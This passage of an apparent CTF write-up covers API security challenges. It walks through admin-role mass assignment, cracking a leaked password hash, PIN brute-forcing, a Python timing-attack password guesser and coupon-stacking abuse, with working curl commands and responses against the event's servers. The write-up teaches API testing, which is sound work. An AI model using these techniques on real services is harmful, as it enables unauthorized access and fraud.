-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmdAdGVzdC5jb20iLCJmaXJzdF9uYW1lIjoiSm9obiIsImxhc3RfbmFtZSI6IkRvZSIsInJvbGUiOiJ1c2VyIiwiZXhwaXJlcyI6MTcxNjQyNTAxNS4xMTQ2ODY3fQ._Ua_mpkrOnoQayFrTyx6g8yC2Q5y92jkhG1VaM-EHIA'
```

![](images/role-reversal-5.png)

Let's try creating a user with the role `admin`.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/signup' \  
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{                                                                                                      
  "email": "testing2@test.com",
  "password": "password",
  "first_name": "John",
  "last_name": "Doe",
  "role": "admin"
}'
```

After going back to the login with the new user, we can retrieve the token.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \                               
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "testing2@test.com",
  "password": "password"
}'
```

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmcyQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1MzEyLjkyNjI1M30.VTUlP_Xexx_7eaAoE5-Wra5LBz01hZx010u0NFgUu7E"}
```

Looking at the administrator user, we see more parameters about the user, one of which is the `flag`.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/users/1' \ 
  -H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmcyQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1MzEyLjkyNjI1M30.VTUlP_Xexx_7eaAoE5-Wra5LBz01hZx010u0NFgUu7E'
```

```
{"id":1,"email":"admin@malteksolutions.com","password":"27d2293cb4e631ee5360429382c9be31db609eaedb0071fddd939aafe4031579","first_name":"Sys","last_name":"Admin","role":"admin","created_time":"2024-05-22 14:59:34","flag":"apisec{l00k_at_m3_1_am_th3_4dm1n_now}"}
```
![](images/role-reversal-6.png)

Flag: apisec{l00k_at_m3_1_am_th3_4dm1n_now}

## Prying Eyes Prohibited

### Points: 150

Since we just rolled out draft posts, we want to make sure they stay safe from prying eyes. If you want to see the stuff from someone else that hasn't been posted yet, you're outta luck! Target URL: [https://blogger.chals.ctf.malteksolutions.com/](https://blogger.chals.ctf.malteksolutions.com/)

From the [Role Reversal](#role-reversal) challenge, we obtain administrative access to the application. In doing so, there was a password field in the response when going to the administrator user. Taking this password, we can run it through CrackStation, and retrieve the password for the administrator user.

![](images/prying-eyes-prohibited-1.png)

Using this password, we can create a token as the administrator by logging in.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \   
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{                                                                                                       
  "email": "admin@malteksolutions.com",
  "password": "koolman1"
}'
```

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1hbHRla3NvbHV0aW9ucy5jb20iLCJmaXJzdF9uYW1lIjoiU3lzIiwibGFzdF9uYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1NTg2LjU2OTU5OTJ9.LW0jm0L8jgRCRFZQdrSs0X6rZ8QbvNUj4sdMG7G8R7A"} 
```

Within the `/posts` endpoint, we see that there are 2 parameters that can be passed.

![](images/prying-eyes-prohibited-2.png)

Since we have the administrator account and token, we can read the draft posts. Looking at the draft post, we see we can retrieve the flag.

![](images/prying-eyes-prohibited-3.png)

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/posts?author_id=1&draft=true' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1hbHRla3NvbHV0aW9ucy5jb20iLCJmaXJzdF9uYW1lIjoiU3lzIiwibGFzdF9uYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1NTg2LjU2OTU5OTJ9.LW0jm0L8jgRCRFZQdrSs0X6rZ8QbvNUj4sdMG7G8R7A'
```

```
{"data":[{"id":1,"title":"Hello World!","content":"apisec{I_f0und_y3r_4dm1n_p0sts}","author_id":1,"created_time":"2024-05-22 14:59:34","draft":"true"},{"id":50,"title":"whatever","content":"text","author_id":1,"created_time":"2024-05-22 19:57:00","draft":"true"}]}
```

Flag: apisec{I_f0und_y3r_4dm1n_p0sts}
## Bonus Points Challenge

*Since I was the 4th team to submit the flag to the creator, I received 70 points.*

Within the FastAPI of blogger, we see there is a `/bonus` endpoint.

When trying to access this endpoint, we receive an interesting error message.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/bonus' \
  -H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1hbHRla3NvbHV0aW9ucy5jb20iLCJmaXJzdF9uYW1lIjoiU3lzIiwibGFzdF9uYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1NTg2LjU2OTU5OTJ9.LW0jm0L8jgRCRFZQdrSs0X6rZ8QbvNUj4sdMG7G8R7A'
```

```
{"error":"This is only available to users who have been registered for more than 2 years."}
```

Looking back at [Role Reversal](#role-reversal), we saw the parameter `created_time`. Let's sign up another user and add this parameter to the command.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/signup' \  
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{                                                                                                      
  "email": "testing3@test.com",
  "password": "password",
  "first_name": "John",
  "last_name": "Doe",
  "role": "admin",
  "created_time":"2021-05-22 14:59:34"
}'
```

![](images/blogger-bonus-1.png)

 Sign into the API to retrieve the user's token.

![](images/blogger-bonus-2.png)

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \                                  
  -H 'accept: application/json' \      
  -H 'Content-Type: application/json' \
  -d '{                                                                                                                    
  "email": "testing3@test.com",        
  "password": "password"
}'
```

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmczQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1OTk5LjE3NTE0MTN9.ME7xU_NfygYOumci1Xe-ZTPkyfOd0vK2wgKteHeYvG0"} 
```

Now, when trying to access the `/bonus` endpoint, we retrieve the bonus flag.

```
curl -X 'GET' \ 
  'https://blogger.chals.ctf.malteksolutions.com/bonus' \                                  
  -H 'accept: application/json' \      
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmczQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1OTk5LjE3NTE0MTN9.ME7xU_NfygYOumci1Xe-ZTPkyfOd0vK2wgKteHeYvG0'
```

![](images/blogger-bonus-3.png)

```
{"flag":"apisec{i_bU1lt_4_t1m3_m4ch1n3}"}
```

Flag: apisec{i_bU1lt_4_t1m3_m4ch1n3}

---
# Hoard's Door

## Passcode to the Dark Vault

### Points: 75

It seems you found the door to Sauron's Gold! Can you figure out the Passcode? Target URL: [https://hoards-door-1.chals.ctf.malteksolutions.com](https://hoards-door-1.chals.ctf.malteksolutions.com/)

Looking at the home page, there are a `/vault` endpoint that requires a 4 digit numerical PIN value.

![](images/hoards-door-1.png)

We can bruteforce this PIN value between 0000 and 9999 using Burp Suite Intruder, and retrieve the flag.

![](images/hoards-door-2.png)

Flag: apisec{th4t_W45_P1n-Cr3d1bl3}

## Unlocking Sauron's Gold

### Points: 150

*I did not receive points for this challenge as it was solved after the competition concluded.*

That first door wasn't too hard, but can you figure out the next one? Sauron's Gold is just beyond this door. Target URL: [https://hoards-door-2.chals.ctf.malteksolutions.com/](https://hoards-door-2.chals.ctf.malteksolutions.com/)

Looking at the home page, we see that there is a `/vault` endpoint.

![](images/unlocking-saurons-gold-1.png)

We can create python script that will bruteforce the password for each character. This attack is a time based attack, so you will need to pay attention to each character being passed and the time it takes for the server to respond.

```python
import requests
import string
import time

url = "https://hoards-door-2.chals.ctf.malteksolutions.com/vault"

password = ""

characters = string.ascii_lowercase + string.ascii_uppercase

headers = {"Content-Type": "application/json"}

while True:
    max_elapsed_time = 0
    best_char = None
    for char in characters:
        data = {"Password": f"{password}{char}"}
        try:
            start_time = time.time()
            response = requests.post(url, json=data, headers=headers)
            end_time = time.time()
            elapsed_time = end_time - start_time
            print(f"Trying password: {password}{char} - Response time: {elapsed_time:.2f} seconds")
            if elapsed_time > max_elapsed_time:
                max_elapsed_time = elapsed_time
                best_char = char
                
            if "Incorrect Password" not in response.text:
                password += char
                print(f"Password found: {password}")
                print(response.text)
                exit()
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            continue

    if best_char:
        password += best_char
        print(f"Password found so far: {password}")
```

After letting it run, we see that the password is `OpenSesame`, and we can retrieve the flag.

![](images/unlocking-saurons-gold-2.png)

Flag: apisec{t1me_15_0f_ThE_3ss3nc3}

---
# Uber Orc

## Did Someone Order a Flag?

### Points: 100

The orcs gotta eat right? Luckily Sauron is always there to help every orc with their dietary needs. And he included coupons! What a guy. Target URL: [https://uber-orc-1.chals.ctf.malteksolutions.com/](https://uber-orc-1.chals.ctf.malteksolutions.com/)

Going to the home page, we see a few interesting endpoints.

![](images/did-someone-order-a-flag-1.png)

First, we can view all the restaurants on the API.

```
curl -X GET https://uber-orc-1.chals.ctf.malteksolutions.com/restaurants
```

```
{"0":"Ent in the Box","1":"Orc Hut","2":"GFC","3":"WhataGnome","4":"McSauron's"}
```

We see there are 5 restaurants within the API.

After looking at the menu for each of the restaurants, we see the GFC (ID 2) has a `Flag` item in the menu.

```
curl -X GET -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/menu | jq
```

![](images/did-someone-order-a-flag-2.png)

We can look at all the coupons within the API, and see on the 20th hour, there is a $2 coupon. Since the Flag costs $999, it's safe to assume that we will need this coupon.

```
curl -X GET -s https://uber-orc-1.chals.ctf.malteksolutions.com/coupons/20 | jq
```

![](images/did-someone-order-a-flag-3.png)

After trying to order something with this coupon, we see that $2 gets removed from the total.

```
curl -X POST -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/order -H "Content-Type: application/json" -d '{"Time":20,"Menu_Items":"5","Coupons":"3"}' | jq
```

![](images/did-someone-order-a-flag-4.png)

If we add a comma in the coupons and add another 3, we see that $4 gets removed from the total.

```
curl -X POST -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/order -H "Content-Type: application/json" -d '{"Time":20,"Menu_Items":"5","Coupons":"3,3"}' | jq
```

![](images/did-someone-order-a-flag-5.png)

After putting 500 3's into the command, we retrieve the flag.

```
curl -X POST -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/order -H "Content-Type: application/json" -d '{"Time":20,"Menu_Items":"5","Coupons":"3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3"}'
```

![](images/did-someone-order-a-flag-6.png)

Flag: {p3rh4ps_y0u_sh0uld_c0ns1d3r_4_w4ll3t}

## This is Why We Can't Have Nice Things

### Points: 150

*I did not receive points for this challenge as it was solved after the competition concluded.*

Apparently _someone_ found a way to abuse the coupon system. Now we're limited to one coupon per customer. Thanks a lot, jerks. Target URL: [https://uber-orc-2.chals.ctf.malteksolutions.com/](https://uber-orc-2.chals.ctf.malteksolutions.com/)

Looking at all the different restaurants menus, we see that there a `Flag` item.

```
curl -X GET https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/menu -s | jq
```

![](images/this-is-why-we-cant-have-nice-things-1.png)

After looking through all the coupons, we see that hour 12 has the $2 coupon.

```
curl -X GET https://uber-orc-2.chals.ctf.malteksolutions.com/coupons/12 -s | jq
```

![](images/this-is-why-we-cant-have-nice-things-2.png)

When using the coupon, we see that the total deceases by $2.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"2"}' | jq
```

![](images/this-is-why-we-cant-have-nice-things-3.png)

However, when trying to add comma and another 2 in the `Coupon` parameter, we receive an error message.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"2,2"}' | jq
```

![](images/this-is-why-we-cant-have-nice-things-4.png)

Removing the comma, we see that $4 gets removed from the total, resulting in an improper check on the backend.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"22"}' | jq
```

![](images/this-is-why-we-cant-have-nice-things-5.png)

Sending 500 2's in the `Coupon` parameter, we can retrieve the flag.

```
curl -X POST -s https://uber-orc-2.chals.ctf.malteksolutions.com/restaurant/4/order -H "Content-Type: application/json" -d '{"Time":12,"Menu_Items":"7","Coupon":"22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222"}' | jq
```

![](images/this-is-why-we-cant-have-nice-things-6.png)

Flag: apisec{t0o_ManY_c0UpoN5}

---

# Let's Begin

## Were You Paying Attention?

### Points: 25

This challenge is to make sure you understand what's going on, how things work, and where to find help. The flag is the name of the Discord channel where you can reach out in case you run into any problems. All the information is provided in the Competition Info section of the scoreboard.

Submit the flag as `apisec{name-of-channel}`.

_NOTE:_ THE FORMAT OF ALL FLAGS FOR THE EVENT WILL FOLLOW THE SAME STRUCTURE!

In the rules, there is information about the Discord. Joining the discord, we see there is the channel `apisec-con-ctf`.

Flag: apisec{apisec-con-ctf}